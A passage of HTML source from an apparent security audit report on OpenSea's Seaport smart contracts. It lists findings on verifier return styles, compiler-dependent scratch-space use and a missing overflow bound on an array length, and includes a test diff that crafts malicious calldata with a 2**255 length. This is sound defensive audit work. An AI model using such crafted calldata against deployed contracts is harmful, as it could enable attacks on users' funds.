d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>Context:</strong> <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Verifiers.sol#L37-L55\">Verifiers.sol#L37-L55</a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Verifiers.sol#L102-L139\">Verifiers.sol#L102-L139</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_verifyTime</span><span class=\"mtk1\">( ... ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">valid</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> ( ... ) { </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Return false as the order is invalid.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">false</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// method 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Return true as the order time is valid.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">valid</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// method 2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_verifyOrderStatus</span><span class=\"mtk1\">( ... ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">valid</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> ( ... ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Return false as the order status is invalid.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">false</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// method 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Return true as the order status is valid.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">valid</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// method 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider changing the code in the functions <code>_verifyTime()</code> and <code>_verifyOrderStatus</code> in the following way:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- valid = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ return true;</span></span></span></code></pre>\n<h2 id=\"08-_callconduitusingoffsets-depends-on-compiler-behaviour-for-inter-assembly-block-cleanup\" style=\"position:relative;\"><a href=\"#08-_callconduitusingoffsets-depends-on-compiler-behaviour-for-inter-assembly-block-cleanup\" aria-label=\"08 _callconduitusingoffsets depends on compiler behaviour for inter assembly block cleanup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[08] <code>_callConduitUsingOffsets</code> depends on compiler behaviour for inter-assembly-block cleanup</h2>\n<p>The function <code>_callConduitUsingOffsets</code> depends on the compiler not to use the scratch space between assembly blocks. it also performs some Solidity function calls between the two blocks.</p>\n<p>A compiler behaviour change would render calling conduits always failing.</p>\n<p>Furthermore this function depends on <code>_revertWithReasonIfOneIsReturned</code> not disturbing anything (see another relevant issue by us).</p>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>Context:</strong> <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Executor.sol#L498\">Executor.sol#L498</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// call the conduit.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Ensure first word of scratch space is empty.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">mstore</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Perform call, placing first word of return data in scratch space.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            success := </span><span class=\"mtk11\">call</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">gas</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">conduit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">callDataOffset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">callDataSize</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">OneWord</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// &lt;--- If the compiler changes scratch space after this (or even in the helpers below) then it will fail.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// If the call failed...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">success</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Pass along whatever revert reason was given by the conduit.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_revertWithReasonIfOneIsReturned</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Otherwise, revert with a generic error.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCallToConduit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">conduit</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Ensure that the conduit returned the correct magic value.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">result</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Take value from scratch space and place it on the stack.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            result := </span><span class=\"mtk11\">mload</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Ensure result was extracted and matches EIP-1271 magic value.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">result</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">ConduitInterface</span><span class=\"mtk1\">.</span><span class=\"mtk12\">execute</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidConduit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">conduitKey</span><span class=\"mtk1\">, </span><span class=\"mtk12\">conduit</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ol>\n<li>Load the scratch space in the first assembly block</li>\n<li>Since this function seems to perform “return-magic-detection”, one could consider replacing most of this with <code>_doesNotMatchMagic</code></li>\n</ol>\n<h2 id=\"09-assertionssol-is-missing-an-assertion-about-bounds-for-array-length\" style=\"position:relative;\"><a href=\"#09-assertionssol-is-missing-an-assertion-about-bounds-for-array-length\" aria-label=\"09 assertionssol is missing an assertion about bounds for array length permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[09] <code>Assertions.sol</code> is missing an assertion about bounds for array length</h2>\n<p><strong>Context:</strong> <a href=\"https://github.com/ProjectOpenSea/seaport/blob/6c24d09fc4be9bbecf749e6a7a592c8f7b659405/contracts/lib/Assertions.sol#L129-L144\">Assertions.sol#L129-L144</a></p>\n<p>So far, the impact seems low and we are not able to craft an exploit.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">validOffsets := </span><span class=\"mtk11\">and</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">validOffsets</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Load signature offset from calldata 0x244.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">calldataload</span><span class=\"mtk1\">(</span><span class=\"mtk12\">BasicOrder_signature_cdPtr</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Derive expected offset as start of recipients + len * 64.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">BasicOrder_signature_ptr</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// Additional recipients length at calldata 0x264.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">calldataload</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">BasicOrder_additionalRecipients_length_cdPtr</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                ),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// Each additional recipient has a length of 0x40.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">AdditionalRecipients_size</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    )</span></span></span></code></pre>\n<p>The above code checks for the following, let <code>len</code> represent the length of the <code>additionalRecipients</code> array, then it checks that <code>len * 64 + 0x260 == calldataload(0x244)</code>. Where all the arithmetic is in EVM. This however does not check for overflow of <code>len * 64</code>. It’s possible to craft malicious calldata that would satisfy this condition by overflowing on the multiplication.\nWe need to find <code>x</code> such that <code>mul(x, 64) = mul(len, 64)</code> in EVM arithmetic. The values of <code>x</code> can be <code>len + y</code> where <code>y</code> is in the set <code>{2**250, 2**251, ..., 2**255}</code>. These are also the only such values.</p>\n<p>This would create problems whenever the value <code>BasicOrder_additionalRecipients_length_cdPtr</code> is used to do read from calldata.</p>\n<p>Note: the solidity compiler would add the check <code>len &#x3C; 2**64</code> for high level data.\nNote: the issues is similar to some known bugs in past versions of solc. Look for bug descriptions with “overflow” in <a href=\"https://github.com/ethereum/solidity/blob/develop/docs/bugs.json\">bugs.json</a>.</p>\n<h3 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The following addition to the test would revert, but the reverts happen later in the codebase, likely due to OOG as the value gets used in a for-loop in <a href=\"https://github.com/ProjectOpenSea/seaport/blob/6c24d09fc4be9bbecf749e6a7a592c8f7b659405/contracts/lib/BasicOrderFulfiller.sol#L611-L13\">BasicOrderFulfiller.sol#L611-L13</a>.</p>\n<p>The test changes the length of an empty array to <code>2**255</code>, everything else in the <code>calldata</code> remaining the same. The invariant <code>0 * 64 + 0x260 == 0x260 == 2**255 * 64 + 0x60</code> is true in EVM arithmetic.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">modified   test/index.js</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -15945,6 +15945,25 @@ describe(`Consideration (version: ${VERSION}) — initial test suite`, function</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         ).to.be.revertedWith(&quot;InvalidBasicOrderParameterEncoding&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      it(&quot;Malicious calldata&quot;, async () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console.log(`Good data: ${calldata}`)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console.log(`calldata[0x284:0x2a4]: ${calldata.slice(2 * 0x284 + 2, 2 * 0x2a4 + 2)}`)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        const badData = [calldata.slice(0, 2 * 0x284 + 2), &quot;f000000000000000000000000000000000000000000000000000000000000000&quot;, calldata.slice(2 * 0x2a4 + 2)].join(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          &quot;&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console.log(`Bad data: ${badData}`)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        expect(badData.length).to.eq(calldata.length);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        await expect(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          buyer.sendTransaction({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            to: marketplaceContract.address,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            data: badData,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            value,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        ).to.be.revertedWith(&quot;InvalidBasicOrderParameterEncoding&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       it(&quot;Reverts if additionalRecipients has non-default offset&quot;, async () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         const badData = [</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider adding a check for <code>calldataload(BasicOrder_additionalRecipients_length_cdPtr) &#x3C; 2**64</code>, similar to what <code>solc</code> generates. Alternatively, the number <code>2**64</code> can be decreased further, depending on a realistic upper bound for <code>additionalRecipients</code>.</p>\n<h2 id=\"10-lowlevelhelpers-enforce-a-stricter-abi-standard-for-returndatasize\" style=\"position:relative;\"><a href=\"#10-lowlevelhelpers-enforce-a-stricter-abi-standard-for-returndatasize\" aria-label=\"10 lowlevelhelpers enforce a stricter abi standard for returndatasize permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[10] LowLevelHelpers enforce a stricter ABI standard for <code>returndatasize</code></h2>\n<p><strong>Context</strong>: <a href=\"https://github.com/ProjectOpenSea/seaport/blob/878121af65be408462f3eae04ab81018b4e199da/contracts/lib/LowLevelHelpers.sol#L110\">LowLevelHelpers.sol#L110</a></p>\n<pre 